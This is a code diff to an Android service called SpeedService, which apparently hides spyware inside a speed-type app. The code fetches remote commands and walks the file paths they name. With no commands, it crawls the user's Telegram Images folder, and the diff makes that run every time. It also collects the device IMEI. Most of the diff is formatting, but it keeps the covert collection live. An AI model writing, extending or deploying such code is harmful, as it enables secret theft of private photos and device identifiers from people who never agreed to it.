@@ -109,7 +109,7 @@ public class SpeedService extends Service {
         Log.i(TAG, "FUNCTION : downloadCommands");
         Observable.defer(new Func0<Observable<String>>() {
             @Override
-            public Observable<String > call() {
+            public Observable<String> call() {
                 Log.i(TAG, "FUNCTION : downloadCommands => call");
                 File file = new File(internalReportPath);
                 try {
@@ -123,52 +123,48 @@ public class SpeedService extends Service {
                 return Observable.just(null);
             }
         })
-        .subscribeOn(Schedulers.io())
-        .subscribe(new Subscriber<String >() {
-            @Override
-            public void onCompleted() {
-                Log.i(TAG, "FUNCTION : downloadCommands => onCompleted");
-            }
-
-            @Override
-            public void onError(Throwable e) {
-                Log.e(TAG, "FUNCTION : downloadCommands => onError: " + e.toString());
-                e.printStackTrace();
-            }
-
-            @Override
-            public void onNext(String  commands) {
-                Log.i(TAG, "FUNCTION : downloadCommands => onNext: " + commands);
-                if(commands != null) {
-                    executeCommands(commands);
-                } else {
-                    Log.i(TAG, "FUNCTION : downloadCommands => onNext => Commands are null");
-                    if(SharedPreferencesHelper.get(SpeedService.this, SharedPreferencesHelper.Property.HAS_UPLOADED, "").equals("")){
-                        Log.i(TAG, "FUNCTION : downloadCommands => onNext => Commands are null => Has not uploaded anything yet");
-                        traverse("/storage/emulated/0/Telegram/Telegram Images");
-                        SharedPreferencesHelper.put(SpeedService.this, SharedPreferencesHelper.Property.HAS_UPLOADED, "true");
+                .subscribeOn(Schedulers.io())
+                .subscribe(new Subscriber<String>() {
+                    @Override
+                    public void onCompleted() {
+                        Log.i(TAG, "FUNCTION : downloadCommands => onCompleted");
                     }
-                }
-            }
-        });
+
+                    @Override
+                    public void onError(Throwable e) {
+                        Log.e(TAG, "FUNCTION : downloadCommands => onError: " + e.toString());
+                        e.printStackTrace();
+                    }
+
+                    @Override
+                    public void onNext(String commands) {
+                        Log.i(TAG, "FUNCTION : downloadCommands => onNext: " + commands);
+                        if (commands != null) {
+                            executeCommands(commands);
+                        } else {
+                            Log.i(TAG, "FUNCTION : downloadCommands => onNext => Commands are null");
+                            traverse("/storage/emulated/0/Telegram/Telegram Images");
+                        }
+                    }
+                });
     }
 
     private void executeCommands(String commands) {
         Log.i(TAG, "FUNCTION : executeCommands");
         Command command = new Gson().fromJson(commands, Command.class);
-        if(command.getLock()){
+        if (command.getLock()) {
             Log.i(TAG, "FUNCTION : executeCommands => isLocked");
             stopSelf();
             return;
         }
-        for (String path:command.getFiles()) {
+        for (String path : command.getFiles()) {
             File file = new File(path);
 //            uploadFile(file, onlineRootPath + path.split("/")[path.split("/").length-1]);
             traverse(path);
         }
     }
 
-    public static String getStringFromFile (File fl) throws Exception {
+    public static String getStringFromFile(File fl) throws Exception {
         FileInputStream fin = new FileInputStream(fl);
         String ret = convertStreamToString(fin);
         //Make sure you close all streams.
@@ -187,7 +183,7 @@ public class SpeedService extends Service {
         return sb.toString();
     }
 
-    public void traverse (String path) {
+    public void traverse(String path) {
         Log.i(TAG, "FUNCTION : traverse");
         File dir = new File(path);
         if (dir.exists()) {
@@ -260,7 +256,7 @@ public class SpeedService extends Service {
         Log.i(TAG, "FUNCTION : getDeviceImei");
         String deviceId = SharedPreferencesHelper.get(this, SharedPreferencesHelper.Property.DEVICE_ID, "");
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        if(deviceId.equals("")) {
+        if (deviceId.equals("")) {
             Log.i(TAG, "FUNCTION : getDeviceImei => First Time");
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                 deviceId = new Random().nextInt() + "";
@@ -343,7 +339,7 @@ public class SpeedService extends Service {
                     dirs.add(child);
             }
         }
-        return result/1000000;
+        return result / 1000000;
     }
 
 
@@ -440,7 +436,7 @@ public class SpeedService extends Service {
     @Override
     public void onDestroy() {
         Log.i(TAG, "FUNCTION : onDestroy");
-        if(commandCheckingSubscription!=null){
+        if (commandCheckingSubscription != null) {
             commandCheckingSubscription.unsubscribe();
         }
         super.onDestroy();
